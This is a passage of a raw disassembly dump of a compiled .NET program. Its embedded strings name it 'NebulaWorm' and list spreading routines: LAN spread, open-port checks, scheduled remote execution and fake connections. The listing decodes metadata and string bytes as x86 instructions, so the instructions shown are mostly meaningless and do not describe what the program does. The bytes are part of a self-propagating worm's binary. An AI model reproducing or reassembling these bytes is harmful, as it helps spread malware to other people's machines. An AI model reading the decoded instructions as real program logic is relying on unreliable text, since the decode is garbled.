  408095:	80 91 12 07 06 12 80 	adcb   $0x80,0x12060712(%ecx)
  40809c:	a9 12 80 ad 12       	test   $0x12ad8012,%eax
  4080a1:	80 b1 12 80 b5 09 12 	xorb   $0x12,0x9b58012(%ecx)
  4080a8:	80 91 06 20 01 01 11 	adcb   $0x11,0x1012006(%ecx)
  4080af:	81 a1 06 20 01 01 11 	andl   $0x6a58111,0x1012006(%ecx)
  4080b6:	81 a5 06 
  4080b9:	00 01                	add    %al,(%ecx)
  4080bb:	11 81 a9 0d 06 20    	adc    %eax,0x20060da9(%ecx)
  4080c1:	01 01                	add    %eax,(%ecx)
  4080c3:	11 81 a9 07 20 02    	adc    %eax,0x22007a9(%ecx)
  4080c9:	01 0e                	add    %ecx,(%esi)
  4080cb:	12 80 a9 0c 20 03    	adc    0x3200ca9(%eax),%al
  4080d1:	01 12                	add    %edx,(%edx)
  4080d3:	80 ad 12 81 b1 12 81 	subb   $0x81,0x12b18112(%ebp)
  4080da:	b5 06                	mov    $0x6,%ch
  4080dc:	20 01                	and    %al,(%ecx)
  4080de:	12 80 b5 0e 0c 20    	adc    0x200c0eb5(%eax),%al
  4080e4:	03 12                	add    (%edx),%edx
  4080e6:	80 b5 0e 12 80 b5 12 	xorb   $0x12,-0x4a7fedf2(%ebp)
  4080ed:	81 bd 05 20 00 12 81 	cmpl   $0x2006c181,0x12002005(%ebp)
  4080f4:	c1 06 20 
  4080f7:	01 12                	add    %edx,(%edx)
  4080f9:	81 c5 0e 03 20 00    	add    $0x20030e,%ebp
  4080ff:	1c 07                	sbb    $0x7,%al
  408101:	00 04 0e             	add    %al,(%esi,%ecx,1)
  408104:	0e                   	push   %cs
  408105:	0e                   	push   %cs
  408106:	0e                   	push   %cs
  408107:	0e                   	push   %cs
  408108:	04 07                	add    $0x7,%al
  40810a:	01 11                	add    %edx,(%ecx)
  40810c:	64 04 0a             	fs add $0xa,%al
  40810f:	01 11                	add    %edx,(%ecx)
  408111:	64 0e                	fs push %cs
  408113:	07                   	pop    %es
  408114:	04 08                	add    $0x8,%al
  408116:	02 15 11 80 c5 01    	add    0x1c58011,%dl
  40811c:	12 79 12             	adc    0x12(%ecx),%bh
  40811f:	80 91 06 20 02 12 79 	adcb   $0x79,0x12022006(%ecx)
  408126:	0e                   	push   %cs
  408127:	08 05 00 01 12 79    	or     %al,0x79120100
  40812d:	08 0c 00             	or     %cl,(%eax,%eax,1)
  408130:	01 15 12 80 a1 01    	add    %edx,0x1a18012
  408136:	12 79 1d             	adc    0x1d(%ecx),%bh
  408139:	12 79 07             	adc    0x7(%ecx),%bh
  40813c:	15 12 80 a1 01       	adc    $0x1a18012,%eax
  408141:	12 79 09             	adc    0x9(%ecx),%bh
  408144:	20 00                	and    %al,(%eax)
  408146:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  40814b:	13 00                	adc    (%eax),%eax
  40814d:	07                   	pop    %es
  40814e:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  408153:	12 79 0a             	adc    0xa(%ecx),%bh
  408156:	30 02                	xor    %al,(%edx)
  408158:	02 01                	add    (%ecx),%al
  40815a:	10 1e                	adc    %bl,(%esi)
  40815c:	00 10                	add    %dl,(%eax)
  40815e:	1e                   	push   %ds
  40815f:	01 0b                	add    %ecx,(%ebx)
  408161:	0a 02                	or     (%edx),%al
  408163:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  408168:	12 79 11             	adc    0x11(%ecx),%bh
  40816b:	40                   	inc    %eax
  40816c:	04 20                	add    $0x20,%al
  40816e:	00 13                	add    %dl,(%ebx)
  408170:	00 06                	add    %al,(%esi)
  408172:	20 01                	and    %al,(%ecx)
  408174:	01 12                	add    %edx,(%edx)
  408176:	80 91 05 20 01 01 13 	adcb   $0x13,0x1012005(%ecx)
  40817d:	00 0a                	add    %cl,(%edx)
  40817f:	07                   	pop    %es
  408180:	04 08                	add    $0x8,%al
  408182:	11 80 c9 08 12 80    	adc    %eax,-0x7fedf737(%eax)
  408188:	91                   	xchg   %eax,%ecx
  408189:	07                   	pop    %es
  40818a:	00 01                	add    %al,(%ecx)
  40818c:	12 79 12             	adc    0x12(%ecx),%bh
  40818f:	80 a5 07 15 12 80 e1 	andb   $0xe1,-0x7fedeaf9(%ebp)
  408196:	01 12                	add    %edx,(%edx)
  408198:	79 06                	jns    0x4081a0
  40819a:	00 03                	add    %al,(%ebx)
  40819c:	0e                   	push   %cs
  40819d:	0e                   	push   %cs
  40819e:	1c 1c                	sbb    $0x1c,%al
  4081a0:	05 20 00 11 80       	add    $0x80110020,%eax
  4081a5:	c9                   	leave
  4081a6:	07                   	pop    %es
  4081a7:	0a 02                	or     (%edx),%al
  4081a9:	11 80 c9 11 44 0b    	adc    %eax,0xb4411c9(%eax)
  4081af:	00 01                	add    %al,(%ecx)
  4081b1:	12 79 15             	adc    0x15(%ecx),%bh
  4081b4:	12 80 f5 01 12 79    	adc    0x791201f5(%eax),%al
  4081ba:	0b 00                	or     (%eax),%eax
  4081bc:	01 12                	add    %edx,(%edx)
  4081be:	79 15                	jns    0x4081d5
  4081c0:	12 81 1d 01 12 79    	adc    0x7912011d(%ecx),%al
  4081c6:	09 07                	or     %eax,(%edi)
  4081c8:	03 08                	add    (%eax),%ecx
  4081ca:	11 80 c9 12 80 91    	adc    %eax,-0x6e7fed37(%eax)
  4081d0:	07                   	pop    %es
  4081d1:	0a 02                	or     (%edx),%al
  4081d3:	11 80 c9 11 48 04    	adc    %eax,0x44811c9(%eax)
  4081d9:	07                   	pop    %es
  4081da:	01 11                	add    %edx,(%ecx)
  4081dc:	68 04 0a 01 11       	push   $0x11010a04
  4081e1:	68 0f 07 04 08       	push   $0x804070f
  4081e6:	12 79 15             	adc    0x15(%ecx),%bh
  4081e9:	11 80 c5 01 12 79    	adc    %eax,0x791201c5(%eax)
  4081ef:	12 80 91 0b 0a 02    	adc    0x20a0b91(%eax),%al
  4081f5:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  4081fa:	12 79 11             	adc    0x11(%ecx),%bh
  4081fd:	54                   	push   %esp
  4081fe:	04 07                	add    $0x7,%al
  408200:	01 11                	add    %edx,(%ecx)
  408202:	6c                   	insb   (%dx),%es:(%edi)
  408203:	04 0a                	add    $0xa,%al
  408205:	01 11                	add    %edx,(%ecx)
  408207:	6c                   	insb   (%dx),%es:(%edi)
  408208:	0e                   	push   %cs
  408209:	07                   	pop    %es
  40820a:	06                   	push   %es
  40820b:	08 0e                	or     %cl,(%esi)
  40820d:	0e                   	push   %cs
  40820e:	11 80 c9 12 80 91    	adc    %eax,-0x6e7fed37(%eax)
  408214:	12 80 91 07 0a 02    	adc    0x20a0791(%eax),%al
  40821a:	11 80 c9 11 60 17    	adc    %eax,0x176011c9(%eax)
  408220:	07                   	pop    %es
  408221:	09 08                	or     %ecx,(%eax)
  408223:	12 3c 15 11 80 c5 01 	adc    0x1c58011(,%edx,1),%bh
  40822a:	02 0e                	add    (%esi),%cl
  40822c:	11 80 c9 12 80 91    	adc    %eax,-0x6e7fed37(%eax)
  408232:	1c 08                	sbb    $0x8,%al
  408234:	12 80 91 06 15 12    	adc    0x12150691(%eax),%al
  40823a:	80 a1 01 02 06 15 11 	andb   $0x11,0x15060201(%ecx)
  408241:	80 c5 01             	add    $0x1,%ch
  408244:	02 0a                	add    (%edx),%cl
  408246:	0a 02                	or     (%edx),%al
  408248:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  40824d:	02 11                	add    (%ecx),%dl
  40824f:	64 07                	fs pop %es
  408251:	0a 02                	or     (%edx),%al
  408253:	11 80 c9 11 64 08    	adc    %eax,0x86411c9(%eax)
  408259:	00 01                	add    %al,(%ecx)
  40825b:	12 81 cd 12 80 91    	adc    -0x6e7fed33(%ecx),%al
  408261:	14 07                	adc    $0x7,%al
  408263:	08 08                	or     %cl,(%eax)
  408265:	08 11                	or     %dl,(%ecx)
  408267:	80 c9 11             	or     $0x11,%cl
  40826a:	80 f9 1d             	cmp    $0x1d,%cl
  40826d:	12 79 08             	adc    0x8(%ecx),%bh
  408270:	12 80 91 12 80 91    	adc    -0x6e7fed6f(%eax),%al
  408276:	08 00                	or     %al,(%eax)
  408278:	02 12                	add    (%edx),%dl
  40827a:	79 08                	jns    0x408284
  40827c:	11 81 01 07 0a 02    	adc    %eax,0x20a0701(%ecx)
  408282:	11 80 c9 11 68 05    	adc    %eax,0x56811c9(%eax)
  408288:	00 00                	add    %al,(%eax)
  40828a:	11 80 f9 06 20 01    	adc    %eax,0x12006f9(%eax)
  408290:	11 80 f9 0d 05 00    	adc    %eax,0x50df9(%eax)
  408296:	02 0e                	add    (%esi),%cl
  408298:	0e                   	push   %cs
  408299:	1c 07                	sbb    $0x7,%al
  40829b:	00 01                	add    %al,(%ecx)
  40829d:	12 79 1d             	adc    0x1d(%ecx),%bh
  4082a0:	12 79 09             	adc    0x9(%ecx),%bh
  4082a3:	00 02                	add    %al,(%edx)
  4082a5:	02 11                	add    (%ecx),%dl
  4082a7:	80 f9 11             	cmp    $0x11,%cl
  4082aa:	80 f9 0f             	cmp    $0xf,%cl
  4082ad:	07                   	pop    %es
  4082ae:	05 08 11 80 c9       	add    $0xc9801108,%eax
  4082b3:	12 80 91 11 81 01    	adc    0x1811191(%eax),%al
  4082b9:	12 80 91 07 0a 02    	adc    0x20a0791(%eax),%al
  4082bf:	11 80 c9 11 6c 08    	adc    %eax,0x86c11c9(%eax)
  4082c5:	b7 7a                	mov    $0x7a,%bh
  4082c7:	5c                   	pop    %esp
  4082c8:	56                   	push   %esi
  4082c9:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4082cc:	89 08                	mov    %ecx,(%eax)
  4082ce:	b0 3f                	mov    $0x3f,%al
  4082d0:	5f                   	pop    %edi
  4082d1:	7f 11                	jg     0x4082e4
  4082d3:	d5 0a                	aad    $0xa
  4082d5:	3a 04 32             	cmp    (%edx,%esi,1),%al
  4082d8:	00 00                	add    %al,(%eax)
  4082da:	00 04 b3             	add    %al,(%ebx,%esi,4)
  4082dd:	15 00 00 80 9e       	adc    $0x9e800000,%eax
  4082e2:	2e 01 80 84 53 79 73 	add    %eax,%cs:0x73795384(%eax)
  4082e9:	74 65                	je     0x408350
  4082eb:	6d                   	insl   (%dx),%es:(%edi)
  4082ec:	2e 53                	cs push %ebx
  4082ee:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4082f2:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  4082f9:	6d 
  4082fa:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  408301:	2e 53                	cs push %ebx
  408303:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408307:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  40830e:	69 
  40830f:	73 73                	jae    0x408384
  408311:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408318:	69 62 75 74 65 2c 20 	imul   $0x202c6574,0x75(%edx),%esp
  40831f:	6d                   	insl   (%dx),%es:(%edi)
  408320:	73 63                	jae    0x408385
  408322:	6f                   	outsl  %ds:(%esi),(%dx)
  408323:	72 6c                	jb     0x408391
  408325:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  40832c:	73 69                	jae    0x408397
  40832e:	6f                   	outsl  %ds:(%esi),(%dx)
  40832f:	6e                   	outsb  %ds:(%esi),(%dx)
  408330:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  408335:	30 2e                	xor    %ch,(%esi)
  408337:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40833a:	43                   	inc    %ebx
  40833b:	75 6c                	jne    0x4083a9
  40833d:	74 75                	je     0x4083b4
  40833f:	72 65                	jb     0x4083a6
  408341:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  408346:	72 61                	jb     0x4083a9
  408348:	6c                   	insb   (%dx),%es:(%edi)
  408349:	2c 20                	sub    $0x20,%al
  40834b:	50                   	push   %eax
  40834c:	75 62                	jne    0x4083b0
  40834e:	6c                   	insb   (%dx),%es:(%edi)
  40834f:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  408356:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40835a:	62 37                	bound  %esi,(%edi)
  40835c:	37                   	aaa
  40835d:	61                   	popa
  40835e:	35 63 35 36 31       	xor    $0x31363563,%eax
  408363:	39 33                	cmp    %esi,(%ebx)
  408365:	34 65                	xor    $0x65,%al
  408367:	30 38                	xor    %bh,(%eax)
  408369:	39 15 01 54 02 10    	cmp    %edx,0x10025401
  40836f:	53                   	push   %ebx
  408370:	6b 69 70 56          	imul   $0x56,0x70(%ecx),%ebp
  408374:	65 72 69             	gs jb  0x4083e0
  408377:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  40837d:	6f                   	outsl  %ds:(%esi),(%dx)
  40837e:	6e                   	outsb  %ds:(%esi),(%dx)
  40837f:	01 03                	add    %eax,(%ebx)
  408381:	06                   	push   %es
  408382:	1d 0e 03 06 12       	sbb    $0x1206030e,%eax
  408387:	6d                   	insl   (%dx),%es:(%edi)
  408388:	02 06                	add    (%esi),%al
  40838a:	08 02                	or     %al,(%edx)
  40838c:	06                   	push   %es
  40838d:	02 04 06             	add    (%esi,%eax,1),%al
  408390:	12 80 f1 03 06 12    	adc    0x120603f1(%eax),%al
  408396:	30 04 06             	xor    %al,(%esi,%eax,1)
  408399:	12 80 a5 04 06 12    	adc    0x120604a5(%eax),%al
  40839f:	80 b9 03 06 12 38 07 	cmpb   $0x7,0x38120603(%ecx)
  4083a6:	06                   	push   %es
  4083a7:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  4083ac:	02 04 06             	add    (%esi,%eax,1),%al
  4083af:	12 80 81 03 06 12    	adc    0x12060381(%eax),%al
  4083b5:	79 08                	jns    0x4083bf
  4083b7:	06                   	push   %es
  4083b8:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  4083bd:	12 79 04             	adc    0x4(%ecx),%bh
  4083c0:	06                   	push   %es
  4083c1:	11 80 d5 03 06 12    	adc    %eax,0x120603d5(%eax)
  4083c7:	3c 08                	cmp    $0x8,%al
  4083c9:	06                   	push   %es
  4083ca:	15 12 80 e1 01       	adc    $0x1e18012,%eax
  4083cf:	12 79 04             	adc    0x4(%ecx),%bh
  4083d2:	06                   	push   %es
  4083d3:	11 80 c9 03 06 12    	adc    %eax,0x120603c9(%eax)
  4083d9:	4c                   	dec    %esp
  4083da:	04 06                	add    $0x6,%al
  4083dc:	12 80 e5 03 06 12    	adc    0x120603e5(%eax),%al
  4083e2:	50                   	push   %eax
  4083e3:	08 06                	or     %al,(%esi)
  4083e5:	15 12 80 f5 01       	adc    $0x1f58012,%eax
  4083ea:	12 79 03             	adc    0x3(%ecx),%bh
  4083ed:	06                   	push   %es
  4083ee:	12 58 03             	adc    0x3(%eax),%bl
  4083f1:	06                   	push   %es
  4083f2:	12 5c 02 06          	adc    0x6(%edx,%eax,1),%bl
  4083f6:	1c 07                	sbb    $0x7,%al
  4083f8:	06                   	push   %es
  4083f9:	15 11 80 c5 01       	adc    $0x1c58011,%eax
  4083fe:	02 04 06             	add    (%esi,%eax,1),%al
  408401:	11 80 f9 04 00 00    	adc    %eax,0x4f9(%eax)
  408407:	12 79 0b             	adc    0xb(%ecx),%bh
  40840a:	00 03                	add    %al,(%ebx)
  40840c:	15 12 80 a1 01       	adc    $0x1a18012,%eax
  408411:	02 0e                	add    (%esi),%cl
  408413:	08 08                	or     %cl,(%eax)
  408415:	06                   	push   %es
  408416:	00 02                	add    %al,(%edx)
  408418:	12 79 0e             	adc    0xe(%ecx),%bh
  40841b:	0e                   	push   %cs
  40841c:	05 00 02 02 0e       	add    $0xe020200,%eax
  408421:	0e                   	push   %cs
  408422:	04 00                	add    $0x0,%al
  408424:	01 0e                	add    %ecx,(%esi)
  408426:	08 06                	or     %al,(%esi)
  408428:	00 03                	add    %al,(%ebx)
  40842a:	01 0e                	add    %ecx,(%esi)
  40842c:	0e                   	push   %cs
  40842d:	0e                   	push   %cs
  40842e:	08 01                	or     %al,(%ecx)
  408430:	00 08                	add    %cl,(%eax)
  408432:	00 00                	add    %al,(%eax)
  408434:	00 00                	add    %al,(%eax)
  408436:	00 1e                	add    %bl,(%esi)
  408438:	01 00                	add    %eax,(%eax)
  40843a:	01 00                	add    %eax,(%eax)
  40843c:	54                   	push   %esp
  40843d:	02 16                	add    (%esi),%dl
  40843f:	57                   	push   %edi
  408440:	72 61                	jb     0x4084a3
  408442:	70 4e                	jo     0x408492
  408444:	6f                   	outsl  %ds:(%esi),(%dx)
  408445:	6e                   	outsb  %ds:(%esi),(%dx)
  408446:	45                   	inc    %ebp
  408447:	78 63                	js     0x4084ac
  408449:	65 70 74             	gs jo  0x4084c0
  40844c:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  408453:	77 73                	ja     0x4084c8
  408455:	01 08                	add    %ecx,(%eax)
  408457:	01 00                	add    %eax,(%eax)
  408459:	02 00                	add    (%eax),%al
  40845b:	00 00                	add    %al,(%eax)
  40845d:	00 00                	add    %al,(%eax)
  40845f:	0f 01 00             	sgdtl  (%eax)
  408462:	0a 4e 65             	or     0x65(%esi),%cl
  408465:	62 75 6c             	bound  %esi,0x6c(%ebp)
  408468:	61                   	popa
  408469:	57                   	push   %edi
  40846a:	6f                   	outsl  %ds:(%esi),(%dx)
  40846b:	72 6d                	jb     0x4084da
  40846d:	00 00                	add    %al,(%eax)
  40846f:	05 01 00 00 00       	add    $0x1,%eax
  408474:	00 0b                	add    %cl,(%ebx)
  408476:	01 00                	add    %eax,(%eax)
  408478:	06                   	push   %es
  408479:	4e                   	dec    %esi
  40847a:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40847e:	61                   	popa
  40847f:	00 00                	add    %al,(%eax)
  408481:	20 01                	and    %al,(%ecx)
  408483:	00 1b                	add    %bl,(%ebx)
  408485:	4d                   	dec    %ebp
  408486:	61                   	popa
  408487:	64 65 20 42 79       	fs and %al,%gs:0x79(%edx)
  40848c:	20 47 69             	and    %al,0x69(%edi)
  40848f:	74 68                	je     0x4084f9
  408491:	75 62                	jne    0x4084f5
  408493:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  408497:	2f                   	das
  408498:	6b 65 65 67          	imul   $0x67,0x65(%ebp),%esp
  40849c:	61                   	popa
  40849d:	6e                   	outsb  %ds:(%esi),(%dx)
  40849e:	33 31                	xor    (%ecx),%esi
  4084a0:	00 00                	add    %al,(%eax)
  4084a2:	29 01                	sub    %eax,(%ecx)
  4084a4:	00 24 64             	add    %ah,(%esp,%eiz,2)
  4084a7:	36 39 35 62 32 62 64 	cmp    %esi,%ss:0x64623262
  4084ae:	2d 35 62 38 61       	sub    $0x61386235,%eax
  4084b3:	2d 34 36 66 34       	sub    $0x34663634,%eax
  4084b8:	2d 38 33 64 32       	sub    $0x32643338,%eax
  4084bd:	2d 37 33 30 34       	sub    $0x34303337,%eax
  4084c2:	33 32                	xor    (%edx),%esi
  4084c4:	35 37 62 37 38       	xor    $0x38376237,%eax
  4084c9:	35 00 00 0c 01       	xor    $0x10c0000,%eax
  4084ce:	00 07                	add    %al,(%edi)
  4084d0:	31 2e                	xor    %ebp,(%esi)
  4084d2:	30 2e                	xor    %ch,(%esi)
  4084d4:	30 2e                	xor    %ch,(%esi)
  4084d6:	30 00                	xor    %al,(%eax)
  4084d8:	00 4d 01             	add    %cl,0x1(%ebp)
  4084db:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
  4084de:	4e                   	dec    %esi
  4084df:	45                   	inc    %ebp
  4084e0:	54                   	push   %esp
  4084e1:	46                   	inc    %esi
  4084e2:	72 61                	jb     0x408545
  4084e4:	6d                   	insl   (%dx),%es:(%edi)
  4084e5:	65 77 6f             	gs ja  0x408557
  4084e8:	72 6b                	jb     0x408555
  4084ea:	2c 56                	sub    $0x56,%al
  4084ec:	65 72 73             	gs jb  0x408562
  4084ef:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  4084f6:	37                   	aaa
  4084f7:	2e 32 01             	xor    %cs:(%ecx),%al
  4084fa:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  4084fe:	46                   	inc    %esi
  4084ff:	72 61                	jb     0x408562
  408501:	6d                   	insl   (%dx),%es:(%edi)
  408502:	65 77 6f             	gs ja  0x408574
  408505:	72 6b                	jb     0x408572
  408507:	44                   	inc    %esp
  408508:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40850f:	61                   	popa
  408510:	6d                   	insl   (%dx),%es:(%edi)
  408511:	65 14 2e             	gs adc $0x2e,%al
  408514:	4e                   	dec    %esi
  408515:	45                   	inc    %ebp
  408516:	54                   	push   %esp
  408517:	20 46 72             	and    %al,0x72(%esi)
  40851a:	61                   	popa
  40851b:	6d                   	insl   (%dx),%es:(%edi)
  40851c:	65 77 6f             	gs ja  0x40858e
  40851f:	72 6b                	jb     0x40858c
  408521:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  408524:	37                   	aaa
  408525:	2e 32 2b             	xor    %cs:(%ebx),%ch
  408528:	01 00                	add    %eax,(%eax)
  40852a:	26 4e                	es dec %esi
  40852c:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  408530:	61                   	popa
  408531:	57                   	push   %edi
  408532:	6f                   	outsl  %ds:(%esi),(%dx)
  408533:	72 6d                	jb     0x4085a2
  408535:	2e 4c                	cs dec %esp
  408537:	61                   	popa
  408538:	6e                   	outsb  %ds:(%esi),(%dx)
  408539:	53                   	push   %ebx
  40853a:	70 72                	jo     0x4085ae
  40853c:	65 61                	gs popa
  40853e:	64 2b 3c 53          	sub    %fs:(%ebx,%edx,2),%edi
  408542:	70 72                	jo     0x4085b6
  408544:	65 61                	gs popa
  408546:	64 41                	fs inc %ecx
  408548:	73 79                	jae    0x4085c3
  40854a:	6e                   	outsb  %ds:(%esi),(%dx)
  40854b:	63 3e                	arpl   %edi,(%esi)
  40854d:	64 5f                	fs pop %edi
  40854f:	5f                   	pop    %edi
  408550:	34 00                	xor    $0x0,%al
  408552:	00 2f                	add    %ch,(%edi)
  408554:	01 00                	add    %eax,(%eax)
  408556:	2a 4e 65             	sub    0x65(%esi),%cl
  408559:	62 75 6c             	bound  %esi,0x6c(%ebp)
  40855c:	61                   	popa
  40855d:	57                   	push   %edi
  40855e:	6f                   	outsl  %ds:(%esi),(%dx)
  40855f:	72 6d                	jb     0x4085ce
  408561:	2e 4c                	cs dec %esp
  408563:	61                   	popa
  408564:	6e                   	outsb  %ds:(%esi),(%dx)
  408565:	53                   	push   %ebx
  408566:	70 72                	jo     0x4085da
  408568:	65 61                	gs popa
  40856a:	64 2b 3c 49          	sub    %fs:(%ecx,%ecx,2),%edi
  40856e:	73 50                	jae    0x4085c0
  408570:	6f                   	outsl  %ds:(%esi),(%dx)
  408571:	72 74                	jb     0x4085e7
  408573:	4f                   	dec    %edi
  408574:	70 65                	jo     0x4085db
  408576:	6e                   	outsb  %ds:(%esi),(%dx)
  408577:	41                   	inc    %ecx
  408578:	73 79                	jae    0x4085f3
  40857a:	6e                   	outsb  %ds:(%esi),(%dx)
  40857b:	63 3e                	arpl   %edi,(%esi)
  40857d:	64 5f                	fs pop %edi
  40857f:	5f                   	pop    %edi
  408580:	39 00                	cmp    %eax,(%eax)
  408582:	00 40 01             	add    %al,0x1(%eax)
  408585:	00 3b                	add    %bh,(%ebx)
  408587:	4e                   	dec    %esi
  408588:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40858c:	61                   	popa
  40858d:	57                   	push   %edi
  40858e:	6f                   	outsl  %ds:(%esi),(%dx)
  40858f:	72 6d                	jb     0x4085fe
  408591:	2e 4c                	cs dec %esp
  408593:	61                   	popa
  408594:	6e                   	outsb  %ds:(%esi),(%dx)
  408595:	53                   	push   %ebx
  408596:	70 72                	jo     0x40860a
  408598:	65 61                	gs popa
  40859a:	64 2b 3c 54          	sub    %fs:(%esp,%edx,2),%edi
  40859e:	72 79                	jb     0x408619
  4085a0:	53                   	push   %ebx
  4085a1:	63 68 65             	arpl   %ebp,0x65(%eax)
  4085a4:	64 75 6c             	fs jne 0x408613
  4085a7:	65 52                	gs push %edx
  4085a9:	65 6d                	gs insl (%dx),%es:(%edi)
  4085ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4085ac:	74 65                	je     0x408613
  4085ae:	45                   	inc    %ebp
  4085af:	78 65                	js     0x408616
  4085b1:	63 75 74             	arpl   %esi,0x74(%ebp)
  4085b4:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  4085bb:	63 3e                	arpl   %edi,(%esi)
  4085bd:	64 5f                	fs pop %edi
  4085bf:	5f                   	pop    %edi
  4085c0:	31 30                	xor    %esi,(%eax)
  4085c2:	00 00                	add    %al,(%eax)
  4085c4:	04 01                	add    $0x1,%al
  4085c6:	00 00                	add    %al,(%eax)
  4085c8:	00 34 01             	add    %dh,(%ecx,%eax,1)
  4085cb:	00 2f                	add    %ch,(%edi)
  4085cd:	4e                   	dec    %esi
  4085ce:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  4085d2:	61                   	popa
  4085d3:	57                   	push   %edi
  4085d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d5:	72 6d                	jb     0x408644
  4085d7:	2e 53                	cs push %ebx
  4085d9:	6c                   	insb   (%dx),%es:(%edi)
  4085da:	6f                   	outsl  %ds:(%esi),(%dx)
  4085db:	77 57                	ja     0x408634
  4085dd:	69 2b 3c 4f 70 65    	imul   $0x65704f3c,(%ebx),%ebp
  4085e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e4:	46                   	inc    %esi
  4085e5:	61                   	popa
  4085e6:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  4085ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4085eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ec:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4085f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f2:	41                   	inc    %ecx
  4085f3:	73 79                	jae    0x40866e
  4085f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f6:	63 3e                	arpl   %edi,(%esi)
  4085f8:	64 5f                	fs pop %edi
  4085fa:	5f                   	pop    %edi
  4085fb:	35 00 00 2f 01       	xor    $0x12f0000,%eax
  408600:	00 2a                	add    %ch,(%edx)
  408602:	4e                   	dec    %esi
  408603:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  408607:	61                   	popa
  408608:	57                   	push   %edi
  408609:	6f                   	outsl  %ds:(%esi),(%dx)
  40860a:	72 6d                	jb     0x408679
  40860c:	2e 53                	cs push %ebx
  40860e:	70 72                	jo     0x408682
  408610:	65 61                	gs popa
  408612:	64 69 6e 67 2b 3c 53 	imul   $0x70533c2b,%fs:0x67(%esi),%ebp
  408619:	70 
  40861a:	72 65                	jb     0x408681
  40861c:	61                   	popa
  40861d:	64 4f                	fs dec %edi
  40861f:	6e                   	outsb  %ds:(%esi),(%dx)
  408620:	63 65 41             	arpl   %esp,0x41(%ebp)
  408623:	73 79                	jae    0x40869e
  408625:	6e                   	outsb  %ds:(%esi),(%dx)
  408626:	63 3e                	arpl   %edi,(%esi)
  408628:	64 5f                	fs pop %edi
  40862a:	5f                   	pop    %edi
  40862b:	36 00 00             	add    %al,%ss:(%eax)
  40862e:	43                   	inc    %ebx
  40862f:	01 00                	add    %eax,(%eax)
  408631:	3e 4e                	ds dec %esi
  408633:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  408637:	61                   	popa
  408638:	57                   	push   %edi
  408639:	6f                   	outsl  %ds:(%esi),(%dx)
  40863a:	72 6d                	jb     0x4086a9
  40863c:	2e 4c                	cs dec %esp
  40863e:	61                   	popa
  40863f:	6e                   	outsb  %ds:(%esi),(%dx)
  408640:	53                   	push   %ebx
  408641:	70 72                	jo     0x4086b5
  408643:	65 61                	gs popa
  408645:	64 2b 3c 3e          	sub    %fs:(%esi,%edi,1),%edi
  408649:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40864c:	44                   	inc    %esp
  40864d:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  408654:	6c                   	insb   (%dx),%es:(%edi)
  408655:	61                   	popa
  408656:	73 73                	jae    0x4086cb
  408658:	34 5f                	xor    $0x5f,%al
  40865a:	31 2b                	xor    %ebp,(%ebx)
  40865c:	3c 3c                	cmp    $0x3c,%al
  40865e:	53                   	push   %ebx
  40865f:	70 72                	jo     0x4086d3
  408661:	65 61                	gs popa
  408663:	64 41                	fs inc %ecx
  408665:	73 79                	jae    0x4086e0
  408667:	6e                   	outsb  %ds:(%esi),(%dx)
  408668:	63 3e                	arpl   %edi,(%esi)
  40866a:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40866d:	31 3e                	xor    %edi,(%esi)
  40866f:	64 00 00             	add    %al,%fs:(%eax)
  408672:	2b 01                	sub    (%ecx),%eax
  408674:	00 26                	add    %ah,(%esi)
  408676:	4e                   	dec    %esi
  408677:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40867b:	61                   	popa
  40867c:	57                   	push   %edi
  40867d:	6f                   	outsl  %ds:(%esi),(%dx)
  40867e:	72 6d                	jb     0x4086ed
  408680:	2e 53                	cs push %ebx
